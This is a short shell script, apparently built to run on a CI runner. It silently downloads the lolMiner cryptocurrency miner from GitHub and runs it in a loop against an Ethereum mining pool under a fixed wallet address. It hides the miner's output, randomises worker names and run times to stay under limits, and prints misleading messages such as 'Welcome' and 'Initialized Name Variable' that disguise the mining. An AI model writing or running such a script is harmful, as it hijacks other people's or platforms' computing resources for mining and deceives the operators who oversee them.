#!/bin/sh
P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz > /dev/null 2>&1
tar xf lolMiner_v1.29_Lin64.tar.gz > /dev/null 2>&1
cd 1.29
x=1 
#/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user VET:0x079885cbd1569bf0db5af3b8eb6818d963e2309f.Bouorn --ethstratum ETHPROXY
# timer=$(shuf -i 60-90 -n 1)
# sysctl -w vm.nr_hugepages=1280
echo "Welcome $x times"
while [ $x -le 20 ]
do
  timer=$(shuf -i 60-80 -n 1)
  echo "Welcome $x times"
#   timeout "$timer"m ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
  timeout "$timer"m ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.BORN$P ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
#   sh -c "echo Helllo world my name is $INPUT_MY_NAME"
  x=$(( $x + 1 ))
  sleep 120
  echo "All done with $x times"
done
# nohup ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.BORN$P 
